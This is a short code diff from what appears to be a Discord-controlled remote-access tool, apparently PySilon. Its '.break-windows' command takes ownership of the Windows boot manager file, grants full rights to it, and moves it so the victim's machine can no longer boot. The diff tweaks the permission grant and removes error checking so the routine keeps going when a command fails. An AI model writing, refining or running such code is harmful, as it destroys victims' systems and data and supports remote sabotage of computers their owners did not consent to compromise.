@@ -14,7 +14,7 @@ elif message.content == '.break-windows':
 
         file_commands = [
             'takeown /f "C:\\bootmgr"',
-            'icacls "C:\\bootmgr" /grant Everyone:(F)'
+            'icacls "C:\\bootmgr" /grant %USERNAME%:(F)'
         ]
 
         for cmd in explorer_commands:
@@ -24,7 +24,7 @@ elif message.content == '.break-windows':
         os.system("start explorer.exe")
 
         for cmd in file_commands:
-            subprocess.run(cmd, check=True)
+            subprocess.run(cmd)
 
         shutil.move("C:\\bootmgr", "C:\\pysilonontop")
 
